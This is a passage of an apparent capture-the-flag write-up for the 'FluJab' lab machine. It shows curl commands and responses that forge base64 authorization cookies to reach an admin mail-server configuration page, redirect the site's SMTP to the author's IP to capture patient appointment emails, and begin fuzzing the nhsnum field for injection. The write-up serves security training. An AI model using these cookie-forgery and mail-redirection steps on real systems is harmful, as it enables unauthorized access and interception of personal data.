<span class="c1">//  \____  $$| $$  | $$| $$  | $$| $$      | $$      | $$_____/      | $$      | $$  | $$| $$  | $$| $$_____/    </span>
<span class="c1">//  /$$$$$$$/|  $$$$$$/|  $$$$$$/| $$      |  $$$$$$$|  $$$$$$$      |  $$$$$$$|  $$$$$$/|  $$$$$$$|  $$$$$$$    </span>
<span class="c1">// |_______/  \______/  \______/ |__/       \_______/ \_______/       \_______/ \______/  \_______/ \_______/    </span>
<span class="k">include</span><span class="p">(</span><span class="s1">'includes/actions.php'</span><span class="p">);</span>                                                                                                              
<span class="c1">//                                                                                                    /$$ /$$ /$$</span>
<span class="k">include</span><span class="p">(</span><span class="s1">'includes/header.php'</span><span class="p">);</span><span class="c1">//                                                                    | $$| $$| $$</span>
<span class="c1">//                    /$$   /$$  /$$$$$$  /$$   /$$ /$$   /$$ /$$   /$$ /$$   /$$  /$$$$$$   /$$$$$$ | $$| $$| $$</span>
<span class="c1">//                   | $$  | $$ |____  $$| $$  | $$| $$  | $$| $$  | $$| $$  | $$ /$$__  $$ /$$__  $$| $$| $$| $$</span>
<span class="c1">//                   | $$  | $$  /$$$$$$$| $$  | $$| $$  | $$| $$  | $$| $$  | $$| $$$$$$$$| $$$$$$$$|__/|__/|__/</span>
<span class="c1">//                   | $$  | $$ /$$__  $$| $$  | $$| $$  | $$| $$  | $$| $$  | $$| $$_____/| $$_____/            </span>
<span class="c1">//                   |  $$$$$$$|  $$$$$$$|  $$$$$$$|  $$$$$$$|  $$$$$$$|  $$$$$$$|  $$$$$$$|  $$$$$$$ /$$ /$$ /$$</span>
<span class="c1">//                    \____  $$ \_______/ \____  $$ \____  $$ \____  $$ \____  $$ \_______/ \_______/|__/|__/|__/</span>
<span class="c1">//                    /$$  | $$           /$$  | $$ /$$  | $$ /$$  | $$ /$$  | $$                                </span>
<span class="c1">//                   |  $$$$$$/          |  $$$$$$/|  $$$$$$/|  $$$$$$/|  $$$$$$/                                </span>
<span class="c1">//                    \______/            \______/  \______/  \______/  \______/                                 </span>
<span class="k">include</span><span class="p">(</span><span class="s1">'includes/scripts.php'</span><span class="p">);</span>
<span class="c1">//                                                  ▄▄▄▄▄▄▄▄▄▄▄        </span>
<span class="c1">//                                             ▄▄▀▀▀▀          ▀▀▄▄    </span>
<span class="c1">//                                           ▄▀                   ▀▀▄    </span>
<span class="c1">//                                          █                        █</span>
<span class="c1">//                                         █                     ▄▀▀▀▀▀█▄</span>
<span class="c1">//                                        █▀                    █    ▄███</span>
<span class="c1">//                                        █                     █    ▀███</span>
<span class="c1">//                                        █     ▄▀▀██▀▄         █       █</span>
<span class="c1">//                                        █    █  ████ █         ▀▄▄▄▄▄█ </span>
<span class="c1">//                                        █    █  ▀██▀ █               █</span>
<span class="c1">//                                        █    █       █              ▄▀</span>
<span class="c1">//                                        █    ▀▄     ▄▀  ▄▄▄▄▄▄▄▄▄   █  </span>
<span class="c1">//                                        █     ▀▀▀▀▀    █  ▀  ▀  █  ▄▀ </span>
<span class="c1">//                                         █              ▀▄█▄█▄█▀ ▄▀</span>
<span class="c1">//                                          █                     ▄▀    </span>
<span class="k">include</span><span class="p">(</span><span class="s1">'includes/path_handler.php'</span><span class="p">);</span><span class="c1">//      ▀▀▀▄          ▄▄▄▄▄▄▀▀</span>
<span class="c1">//                                            ▄▀         ▀▀  ▄▀ </span>
<span class="c1">//                                          ▄▀               █</span>
<span class="c1">//                                         ▄▀                █  ▄▀▀▀█▀▀▄</span>
<span class="c1">//                                         █    █  █▀▀▀▄     █▀▀    █  █</span>
<span class="c1">//                                        ▄█    ▀▀▀    █     █    ▀▀   █</span>
<span class="c1">//                                        █▀▄          █      █▄       █</span>
<span class="c1">//                                        █  ▀▀▀▀▀█▄▄▄▄▀       ▀█▀▀▀▄▄▄▀</span>
<span class="c1">//                                        █                     █</span>
<span class="c1">//                                        █                     █</span>
<span class="c1">//                                        █                     █</span>
<span class="c1">//                                         █         ▀▄  ▄▀    █</span>
<span class="c1">//                                          █          █        ▀▄</span>
<span class="c1">//                                           █         █          █</span>
<span class="c1">//                                           █         █           ▀▄</span>
<span class="c1">//                                           █      ▄▀▀█▀▀▄        ▄▀▀██▀▄ </span>
<span class="c1">//                                           █             █▀▄            █</span>
<span class="c1">//                                           ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀  ▀ ▀▀▀▀▀▀▀▀▀▀▀</span>
<span class="k">include</span><span class="p">(</span><span class="s1">'includes/fortune.php'</span><span class="p">);</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<p>The <strong><code class="highlighter-rouge">favicon.ico</code></strong> is <strong><em>not</em></strong> an image and it seems to be the structure or template of the site’s webpages.</p>

<p>While the other links seem to work fine,</p>
<blockquote>
  <p><strong><code class="highlighter-rouge">/?cancel</code></strong> redirects to <strong><code class="highlighter-rouge">/?ERROR=NOT_REGISTERED</code></strong></p>

  <p><strong><code class="highlighter-rouge">/?remind</code></strong> redirects to <strong><code class="highlighter-rouge">/?ERROR=NOT_REGISTERED</code></strong></p>
</blockquote>

<p>Attempting to book an appointment for a <strong><em>free flujab</em></strong> in <strong><code class="highlighter-rouge">/?book</code></strong>:</p>

<p><img src="./screenshots/24_flujab/443_freeflujab_booking_form.png" alt="Booking Form" /></p>

<p>But first checking page source to see how the form works:</p>
<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...omitted...
<span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">"post"</span> <span class="na">action=</span><span class="s">"?book"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"row aln-center"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-6 col-12-medium"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;b&gt;</span>Book Your Appointment Today!<span class="nt">&lt;/b&gt;</span>
      <span class="nt">&lt;br&gt;&lt;br&gt;</span>
      <span class="nt">&lt;p&gt;</span>If rou are an existing patient registered with our surgery, 
      we’re here to keep you and your loved ones as healthy as possible, 
      with expert advice on how to protect yourself from seasonal 
      illnesses and ailments, including flu.
      <span class="nt">&lt;/p&gt;</span>
      <span class="nt">&lt;p&gt;</span>Even at our fittest and healthiest, we can still catch the 
      flu. For those over 65, people with a medical condition or
      pregnant women, catching flu can be more serious and that’s
      why we are here to offer a FREE NHS funded flu vaccine.
      <span class="nt">&lt;/p&gt;</span>
      Cricklestone Doctors Surgery<span class="nt">&lt;br&gt;</span>
      NHS England.
      <span class="nt">&lt;p&gt;&lt;/p&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-6 col-12-small"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;h2&gt;</span>Prefered Date: <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"date"</span> <span class="na">name=</span><span class="s">"date"</span> <span class="na">value=</span><span class="s">"2018-11-30"</span> <span class="na">min=</span><span class="s">"2018-10-01"</span> <span class="na">max=</span><span class="s">"2019-03-31"</span><span class="nt">&gt;&lt;br&gt;&lt;br&gt;</span>
      Prefered Time: <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"time"</span> <span class="na">name=</span><span class="s">"time"</span> <span class="na">value=</span><span class="s">"09:00"</span> <span class="na">min</span><span class="err">"</span><span class="na">09:00</span><span class="err">"=""</span> <span class="na">max=</span><span class="s">"16:45"</span><span class="nt">&gt;&lt;/h2&gt;&lt;br&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"fname"</span> <span class="na">id=</span><span class="s">"contact-name"</span> <span class="na">placeholder=</span><span class="s">"Patient First Name"</span> <span class="na">required=</span><span class="s">""</span><span class="nt">&gt;&lt;br&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"lname"</span> <span class="na">id=</span><span class="s">"contact-name"</span> <span class="na">placeholder=</span><span class="s">"Patient Last Name"</span> <span class="na">required=</span><span class="s">""</span><span class="nt">&gt;&lt;br&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"nhsnum"</span> <span class="na">placeholder=</span><span class="s">"NHS Number (if known)"</span> <span class="na">pattern=</span><span class="s">"NHS-\d{3}-\d{3}-\d{4}"</span> <span class="na">title=</span><span class="s">" A Valid NHS Number Is Required e.g. NHS-012-345-6789"</span><span class="nt">&gt;&lt;br&gt;</span>
      <span class="nt">&lt;ul</span> <span class="na">class=</span><span class="s">"actions"</span><span class="nt">&gt;&lt;br&gt;</span>                            
        <span class="nt">&lt;center&gt;&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">class=</span><span class="s">"style1"</span> <span class="na">value=</span><span class="s">"Request Appointment"</span> <span class="na">name=</span><span class="s">"submit"</span><span class="nt">&gt;&lt;/center&gt;</span>
      <span class="nt">&lt;/ul&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
  <span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/form&gt;</span>
...omitted...
</code></pre></div></div>

<p>Now, booking with the following values:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>date=2018-11-30
time=09:00
fname=jebidiah
lname=anthony
nhsnum=	
submit=Request+Appointment   
</code></pre></div></div>

<p>And the HTML Response after booking:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...omitted...
<span class="nt">&lt;script&gt;</span>
  <span class="nx">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">Sorry, jebidiah anthony is not a registered patient!</span><span class="dl">"</span><span class="p">);</span>
<span class="nt">&lt;/script&gt;</span>
...omitted...
</code></pre></div></div>

<p>The form requires a registered patient and <strong><code class="highlighter-rouge">nhsnum</code></strong> is not a required field.</p>

<p>In the <strong><code class="highlighter-rouge">/?info</code></strong> page, there is a section dedicated to patient feedbacks formatted with a remark then first initial and surname:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...omitted...
<span class="nt">&lt;h2&gt;</span>What people say about us<span class="nt">&lt;/h2&gt;&lt;/br&gt;</span>
<span class="nt">&lt;p&gt;</span>
 <span class="nt">&lt;i&gt;</span>"My boss would fire me if i missed a day of work, or couldn't do overtime when he needs me to. The online booking system made things so easy for me to range my flu jab."<span class="nt">&lt;/i&gt;</span>
 <span class="nt">&lt;h3&gt;&lt;i&gt;</span>A. Chun<span class="nt">&lt;/i&gt;&lt;/h3&gt;</span>
<span class="nt">&lt;/p&gt;</span>
<span class="nt">&lt;p&gt;</span>
  <span class="nt">&lt;i&gt;</span>"I normally hate injections, but the warm friendly atmosphere provided by the wonderful NHS staff helped dissolve all of my fears."<span class="nt">&lt;/i&gt;</span>
  <span class="nt">&lt;h3&gt;&lt;i&gt;</span>B. Smith<span class="nt">&lt;/i&gt;&lt;/h3&gt;</span>
<span class="nt">&lt;/p&gt;</span>
<span class="nt">&lt;p&gt;</span>
  <span class="nt">&lt;i&gt;</span>"Having a flu jab was as easy as pie.. pizza pie"<span class="nt">&lt;/i&gt;</span>
  <span class="nt">&lt;h3&gt;&lt;i&gt;</span>L. Feggola<span class="nt">&lt;/i&gt;&lt;/h3&gt;</span>
<span class="nt">&lt;/p&gt;</span>
<span class="nt">&lt;p&gt;</span>
  <span class="nt">&lt;i&gt;</span>"It so quick and painless, not to mention thousands of times safer than crossing the street!"<span class="nt">&lt;/i&gt;</span>
  <span class="nt">&lt;h3&gt;&lt;i&gt;</span>J. Walker<span class="nt">&lt;/i&gt;&lt;/h3&gt;</span>
<span class="nt">&lt;/p&gt;</span>
...omitted...
</code></pre></div></div>

<p>In order to use the services given, a patient must be registered in the system and the register option doesn’t really seem to work and educated guesses might be necessary for a valid patient name.</p>

<p>Educated guesses for a registered patient: <strong>Johnnie Walker</strong>, <strong>Johny Walker</strong>, <strong>John Walker</strong>, <strong>Jay Walker</strong>.</p>

<p>Examining cookies might also prove useful when validating users:</p>

<ul>
  <li>HTTP Request:</li>
</ul>

<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">Patient=daf23866abcb8e29ecee6d3da0caa992; Registered=ZGFmMjM4NjZhYmNiOGUyOWVjZWU2ZDNkYTBjYWE5OTI9TnVsbA%3D%3D</span>
</code></pre></div></div>

<blockquote>
  <p>The base64 decoded <code class="highlighter-rouge">Registered</code> cookie is <strong><code class="highlighter-rouge">daf23866abcb8e29ecee6d3da0caa992=Null</code></strong> which seems connected to the <code class="highlighter-rouge">Patient</code> cookie</p>
</blockquote>

<ul>
  <li>HTTP Response:</li>
</ul>

<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Set-Cookie</span><span class="p">:</span> <span class="s">Modus=Q29uZmlndXJlPU51bGw%3D; expires=Mon, ..-May-2019 ..:..:.. GMT; Max-Age=3600; path=/?smtp_config</span>
</code></pre></div></div>

<blockquote>
  <p>The base64 decoded <strong><code class="highlighter-rouge">Modus</code></strong> cookie is <strong><code class="highlighter-rouge">Configure=Null</code></strong></p>

  <p>There is a path set in the cookie <strong><code class="highlighter-rouge">/?smtp_config</code></strong>. This must be the one referenced earlier by <strong><code class="highlighter-rouge">https://smtp.flujab.htb</code></strong> (<strong><em>This function has been integrated into the new free service application</em></strong>)</p>

  <p><code class="highlighter-rouge">Modus</code>, <code class="highlighter-rouge">Patient</code>, and <code class="highlighter-rouge">Registered</code> are set in the response if not requested.</p>
</blockquote>

<p>Checking for the response headers of <strong><code class="highlighter-rouge">https://freeflujab.htb/?smtp_config</code></strong>:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>curl <span class="nt">-I</span> <span class="nt">-k</span> https://freeflujab.htb/?smtp_config
</code></pre></div></div>
<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">302</span> <span class="ne">Found</span>
<span class="na">Date</span><span class="p">:</span> <span class="s">..., .. May 2019 ..:..:.. GMT</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">keep-alive</span>
<span class="na">Set-Cookie</span><span class="p">:</span> <span class="s">Modus=Q29uZmlndXJlPU51bGw%3D; expires=..., ..-May-2019 ..:..:.. GMT; Max-Age=3600; path=/?smtp_config</span>
<span class="na">Set-Cookie</span><span class="p">:</span> <span class="s">Patient=daf23866abcb8e29ecee6d3da0caa992; expires=..., ..-May-2019 ..:..:.. GMT; Max-Age=3600; path=/</span>
<span class="na">Set-Cookie</span><span class="p">:</span> <span class="s">Registered=ZGFmMjM4NjZhYmNiOGUyOWVjZWU2ZDNkYTBjYWE5OTI9VHJ1ZQ%3D%3D; expires=..., ..-May-2019 ..:..:.. GMT; Max-Age=3600; path=/</span>
<span class="na">Location</span><span class="p">:</span> <span class="s">/?denied</span>
<span class="na">Server</span><span class="p">:</span> <span class="s">ClownWare Proxy</span>
</code></pre></div></div>

<p>The page redirects to <strong><code class="highlighter-rouge">/?denied</code></strong>… maybe the  cookie needs to be set correctly to access the page.</p>

<hr />

<h2 id="part-3--exploitation">PART 3 : EXPLOITATION</h2>

<p>Re-booking an appointment using educated guesses for a registered patient:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>date=2018-11-30
time=09:00
fname=john
lname=walker
nhsnum=	
submit=Request+Appointment
</code></pre></div></div>

<ul>
  <li>HTML Response:</li>
</ul>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...omitted...
<span class="nt">&lt;script&gt;</span>
  <span class="nx">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">Error! Could not connect to a mailserver at :25!</span><span class="dl">"</span><span class="p">);</span>
<span class="nt">&lt;/script&gt;</span>
...omitted...
</code></pre></div></div>

<ul>
  <li>Response Cookies:</li>
</ul>

<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Set-Cookie</span><span class="p">:</span> <span class="s">Modus=Q29uZmlndXJlPU51bGw%3D; expires=..., ..-May-2019 ..:..:.. GMT; Max-Age=3600; path=/?smtp_config</span>
<span class="na">Set-Cookie</span><span class="p">:</span> <span class="s">Registered=ZGFmMjM4NjZhYmNiOGUyOWVjZWU2ZDNkYTBjYWE5OTI9VHJ1ZQ%3D%3D; expires=..., ..-May-2019 ..:..:.. GMT; Max-Age=0; path=/</span>
</code></pre></div></div>

<p><strong><code class="highlighter-rouge">John Walker</code></strong> is a registered patient however it seems that the booked appointment sends to a SMTP server (default port: 25). Since <strong><code class="highlighter-rouge">/?smtp_config</code></strong> was found/set in the cookies, perhaps the cookie is also the way to set a mailserver.</p>

<p>With a registered patient, the decoded base64 <code class="highlighter-rouge">Registered</code> cookie is now set to <strong><code class="highlighter-rouge">True</code></strong>  (<strong><code class="highlighter-rouge">daf23866abcb8e29ecee6d3da0caa992=True</code></strong>). What if the <code class="highlighter-rouge">Modus</code> cookie is also set to <strong>True</strong>.</p>

<blockquote>
  <p>Encoded (Base64) “<strong><code class="highlighter-rouge">Configure=True</code></strong>” : <strong><code class="highlighter-rouge">Q29uZmlndXJlPVRydWU=</code></strong></p>

  <p>URL Encoded cookie: <strong><code class="highlighter-rouge">Modus=Q29uZmlndXJlPVRydWU%3D</code></strong></p>
</blockquote>

<p>Accessing <strong><code class="highlighter-rouge">/?smtp_config</code></strong> with the properly set cookies now returns the following responses:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ cookie</span><span class="o">=</span><span class="s2">"Modus=Q29uZmlndXJlPVRydWU%3D;Patient=daf23866abcb8e29ecee6d3da0caa992;Registered=ZGFmMjM4NjZhYmNiOGUyOWVjZWU2ZDNkYTBjYWE5OTI9VHJ1ZQ%3D%3D;"</span>
  
<span class="nv">$ </span>curl <span class="nt">--cookie</span> <span class="nv">$cookie</span> <span class="nt">-I</span> <span class="nt">-k</span> https://freeflujab.htb/?smtp_config
</code></pre></div></div>
<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Date</span><span class="p">:</span> <span class="s">..., .. May 2019 ..:..:.. GMT</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">keep-alive</span>
<span class="na">Server</span><span class="p">:</span> <span class="s">ClownWare Proxy</span>
</code></pre></div></div>
<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>curl <span class="nt">--cookie</span> <span class="nv">$cookie</span> <span class="nt">-k</span> https://freeflujab.htb/?smtp_config
</code></pre></div></div>
<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"title"</span><span class="nt">&gt;</span>Mailer Configuration<span class="nt">&lt;/div&gt;</span>
  <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;header</span> <span class="na">class=</span><span class="s">"style1"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;h2&gt;</span>Patient Emailer Configuration Settings<span class="nt">&lt;/h2&gt;</span>
      <span class="nt">&lt;h2&gt;</span>Current Setting = SMTP: :25<span class="nt">&lt;/h2&gt;</span>
    <span class="nt">&lt;/header&gt;</span>
    <span class="c">&lt;!-- Contact Form --&gt;</span>
    <span class="nt">&lt;section&gt;</span>
      <span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">"post"</span> <span class="na">action=</span><span class="s">"?smtp_config"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"row aln-center"</span><span class="nt">&gt;</span>
          <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-6 "</span><span class="nt">&gt;</span>
            <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"mailserver"</span> <span class="na">id=</span><span class="s">"email-server"</span> <span class="na">value=</span><span class="s">"smtp.flujab.htb"</span> <span class="na">pattern=</span><span class="s">"smtp.[A-Za-z]{1,255}.[A-Za-z]{2,5}"</span> <span class="na">title=</span><span class="s">" A Valid SMTP Domain Address Is Required"</span><span class="nt">/&gt;</span>
            <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"port"</span> <span class="na">id=</span><span class="s">"port"</span> <span class="na">placeholder=</span><span class="s">"25"</span> <span class="na">value=</span><span class="s">"25"</span> <span class="nt">/&gt;</span>
          <span class="nt">&lt;/div&gt;</span>
          <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-12"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;p&gt;</span>
              WARNING: Only <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/?whitelist"</span><span class="nt">&gt;</span>whitelisted sysadmins<span class="nt">&lt;/a&gt;</span> are authorized to 
              access this page! <span class="nt">&lt;br</span> <span class="err">\</span><span class="nt">&gt;</span> If you are not supposed to 
              change these settings then don't! whitelist will be 
              auto-updated.
            <span class="nt">&lt;/p&gt;</span>
            <span class="nt">&lt;ul</span> <span class="na">class=</span><span class="s">"actions"</span><span class="nt">&gt;</span>
              <span class="nt">&lt;li&gt;&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">class=</span><span class="s">"style1"</span> <span class="na">value=</span><span class="s">"Save Mail Server Config"</span> <span class="na">name=</span><span class="s">"save"</span> <span class="nt">/&gt;&lt;/li&gt;</span>
            <span class="nt">&lt;/ul&gt;</span>
          <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
      <span class="nt">&lt;/form&gt;</span>
    <span class="nt">&lt;/section&gt;</span>
  <span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/div&gt;</span>
...omitted...
</code></pre></div></div>

<p>The <code class="highlighter-rouge">mailserver</code> parameter only accepts a certain pattern which could be bypassed by changing the input <strong><em>value</em></strong> to anything you want or by intercepting the request and changing the values there.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nv">data</span><span class="o">=</span><span class="s2">"mailserver=10.10.15.10&amp;port=25&amp;save=Save+Mail+Server+Config"</span>
<span class="go">
</span><span class="gp">$</span><span class="w"> </span>curl <span class="nt">-b</span> <span class="nv">$cookie</span> <span class="nt">-d</span> <span class="nv">$data</span> <span class="nt">-k</span> https://freeflujab.htb/?smtp_config
</code></pre></div></div>
<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...omitted...
<span class="nt">&lt;h2&gt;</span>Patient Emailer Configuration Settings<span class="nt">&lt;/h2&gt;</span>
<span class="nt">&lt;h2&gt;</span>Current Setting = SMTP: 10.10.15.10:25<span class="nt">&lt;/h2&gt;</span>
...omitted...
</code></pre></div></div>

<p>All that is left is to set-up an SMTP server locally and wait for messages after booking an appointment:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>python <span class="nt">-m</span> smtpd <span class="nt">-c</span> DebuggingServer <span class="nt">-n</span> 10.10.15.10:25
</code></pre></div></div>
<blockquote>
  <p>From the <a href="https://docs.python.org/3/library/smtpd.html">Python smtpd documentation</a>:</p>

  <p>DebuggingServer Objects</p>

  <p>class smtpd.DebuggingServer(localaddr, remoteaddr)</p>

  <p>Create a new debugging server. Arguments are as per SMTPServer. Messages will be discarded, and printed on stdout.</p>
</blockquote>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ data</span><span class="o">=</span><span class="s2">"date=2018-11-30&amp;time=09:00&amp;fname=john&amp;lname=walker&amp;nhsnum=&amp;submit=Request+Appointment"</span>

<span class="nv">$ </span>curl <span class="nt">-b</span> <span class="nv">$cookie</span> <span class="nt">-d</span> <span class="nv">$data</span> <span class="nt">-k</span> https://freeflujab.htb/?book
</code></pre></div></div>

<p>Checking the started mailserver after booking:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">---------- MESSAGE FOLLOWS ----------
Date: ..., .. May 2019 ..:..:.. +0100
To: jwalker@tuta.io
</span><span class="gp">From: Nurse Julie &lt;DutyNurse@flujab.htb&gt;</span><span class="w">
</span><span class="go">Subject: Flu Jab Appointment - Ref:NHS-921-376-3922
</span><span class="gp">Message-ID: &lt;6c7e8490856eef3377e672b3684e342b@freeflujab.htb&gt;</span><span class="w">
</span><span class="go">X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
</span><span class="gp">Content-Type: text/plain;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>iso-8859-1
<span class="go">X-Peer: 10.10.10.124

  Dear Mr john walker,

  Here are the details of your appointment at our surgery.
  ________________________

    VACCINATION
    Routine Priority
    ------------------    
    REF    : NHS-921-376-3922 
    Code   : Influ-022
    Type   : Injection
    Time   : 09:00
    Date   : 2018-11-30
    LOC    : Crick026 
  ________________________

  We look forward to seeing you.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.

------------ END MESSAGE ------------
</span></code></pre></div></div>

<p>An <strong><em>NHS Number</em></strong> was supplied in the email even though it was left empty during the request. This proves that the setup works. Now checking if the response after booking an appointment is different from asking for a reminder.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nv">data</span><span class="o">=</span><span class="s2">"nhsnum=NHS-921-376-3922&amp;submit=Send+Reminder"</span>
<span class="go">
</span><span class="gp">$</span><span class="w"> </span>curl <span class="nt">-b</span> <span class="nv">$cookie</span> <span class="nt">-d</span> <span class="nv">$data</span> <span class="nt">-k</span> https://freeflujab.htb/?remind
</code></pre></div></div>
<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...omitted...
<span class="nt">&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">Email Error: You must provide at least one recipient email address.</span><span class="dl">"</span><span class="p">);</span><span class="nt">&lt;/script&gt;</span>
...omitted...
</code></pre></div></div>

<p>Now, the request requires an <strong><code class="highlighter-rouge">email</code></strong> parameter:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nv">data</span><span class="o">=</span><span class="s2">"nhsnum=NHS-921-376-3922&amp;submit=Send+Reminder&amp;email=DutyNurse@flujab.htb"</span>
<span class="go">
</span><span class="gp">$</span><span class="w"> </span>curl <span class="nt">-b</span> <span class="nv">$cookie</span> <span class="nt">-d</span> <span class="nv">$data</span> <span class="nt">-k</span> https://freeflujab.htb/?remind
</code></pre></div></div>

<p>After sending the request, the mailserver responds with:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">---------- MESSAGE FOLLOWS ----------
Date: ..., .. May 2019 ..:..:.. +0100
To: DutyNurse@flujab.htb
</span><span class="gp">From: Nurse Julie &lt;DutyNurse@flujab.htb&gt;</span><span class="w">
</span><span class="go">Subject: Flu Jab Appointment - Ref:NHS-921-376-3922
</span><span class="gp">Message-ID: &lt;64c2cbafd6e671ec34e3803202871fdc@freeflujab.htb&gt;</span><span class="w">
</span><span class="go">X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
</span><span class="gp">Content-Type: text/plain;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>iso-8859-1
<span class="go">X-Peer: 10.10.10.124

  Dear Mr john walker,

  Here are the details of your appointment at our surgery.
  ________________________
    VACCINATION
    Routine Priority
    ------------------    
    REF    : NHS-921-376-3922    
    Code   : Influ-022
    Type   : Injection
    Stat   : CANCELED 
    LOC    : Crick026
  ________________________

  We look forward to seeing you.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.

------------ END MESSAGE ------------
</span></code></pre></div></div>

<p>Asking for a reminder cancels an appointment… something might be up with this page.</p>

<p>Since the <code class="highlighter-rouge">nhsnum</code> parameter is not really required during requests, maybe it could be used for “injection”:</p>

<h3 id="test-1--fuzzing"><strong style="text-decoration:underline">TEST #1 : Fuzzing</strong></h3>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ data</span><span class="o">=</span><span class="s2">"nhsnum=test&amp;submit=Send+Reminder&amp;email=DutyNurse@flujab.htb"</span>

<span class="nv">$ </span>curl <span class="nt">-b</span> <span class="nv">$cookie</span> <span class="nt">-d</span> <span class="nv">$data</span> <span class="nt">-k</span> https://freeflujab.htb/?remind
</code></pre></div></div>
<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">---------- MESSAGE FOLLOWS ----------
Date: ..., .. May 2019 ..:..:.. +0100
To: DutyNurse@flujab.htb
